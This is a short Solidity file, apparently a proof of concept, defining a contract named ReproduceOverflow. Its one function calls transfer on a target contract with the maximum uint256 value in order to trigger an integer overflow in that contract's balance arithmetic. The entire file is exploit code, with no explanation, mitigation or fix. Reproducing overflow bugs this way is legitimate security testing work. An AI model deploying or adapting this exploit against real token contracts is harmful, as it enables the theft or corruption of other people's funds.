interface IVulnerable {
    function transfer(address _to, uint256 _value) external;
}

contract ReproduceOverflow {
    IVulnerable public vulnerable;

    constructor(address _vulnerableAddress) {
        vulnerable = IVulnerable(_vulnerableAddress);
    }

    function triggerOverflow(address target) public {
        vulnerable.transfer(target, type(uint256).max);
    }
}